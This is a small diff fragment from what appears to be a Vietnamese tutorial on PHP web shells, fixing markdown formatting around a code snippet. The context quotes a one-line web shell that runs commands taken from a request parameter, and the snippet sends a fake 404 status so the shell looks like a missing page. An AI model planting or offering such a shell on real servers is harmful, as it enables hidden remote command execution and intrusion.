@@ -269,7 +269,7 @@ Thay vì mình chỉ code đơn giản là **`<?php system($_REQUEST['x']); ?>`*
 Và cần lưu ý là mình nên giả đến status code nó càng tốt. 
 
 ```php
-**<?php 
+<?php 
 header("HTTP/1.0 404 Not Found");
 ?>
 
